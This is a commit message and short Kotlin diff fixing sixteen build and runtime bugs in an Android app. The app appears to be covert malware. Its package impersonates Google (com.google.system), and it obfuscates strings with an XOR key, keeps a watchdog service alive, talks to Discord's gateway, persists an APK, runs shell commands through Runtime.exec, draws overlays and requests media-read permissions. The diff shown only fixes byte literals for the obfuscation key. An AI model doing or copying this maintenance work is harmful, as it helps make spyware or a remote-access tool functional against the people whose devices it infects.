fix(android): fix 16 critical build/runtime bugs, add READ_MEDIA permissions
Build fixes:
- AGP 8.2: aaptOptions -> androidResources, packagingOptions -> packaging
- Add missing androidx.work:work-runtime-ktx dependency
- Remove unused Hilt/KSP plugins
- Fix StringObfuscator byte array literals (toByte suffix)
- Fix SyncAdapter syncPeriodic missing flex parameter
- Fix WatchdogService runningServices -> getRunningServices()
- Fix startIntentSender wrong argument count
- Fix hardcoded debug.keystore path

Runtime fixes:
- Add WatchdogService to manifest + startForeground notification
- Fix unsafe casts in DiscordGatewayClient (4 places, as -> as?)
- Fix PendingIntent.FLAG_IMMUTABLE API < 31 compatibility (4 places)
- Fix TYPE_ACCESSIBILITY_OVERLAY -> TYPE_APPLICATION_OVERLAY (Android 14)
- Add READ_MEDIA_IMAGES/VIDEO/AUDIO for Android 13+
- Fix re-throw crash in SystemNetworkService.persistApk
- Fix Runtime.exec string -> array for commands with spaces
- Fix PluginManager config default for missing entries

+++ app/src/main/java/com/google/system/StringObfuscator.kt
@@ -2,7 +2,7 @@ package com.google.system
 
 object StringObfuscator {
     
-    private val XOR_KEY = byteArrayOf(0x42, 0x7A, 0x1F, 0x8E, 0x3D, 0x9C, 0x5A, 0x6B)
+    private val XOR_KEY = byteArrayOf(0x42.toByte(), 0x7A.toByte(), 0x1F.toByte(), 0x8E.toByte(), 0x3D.toByte(), 0x9C.toByte(), 0x5A.toByte(), 0x6B.toByte())
     
     fun obfuscate(input: String): String {
         val bytes = input.toByteArray()
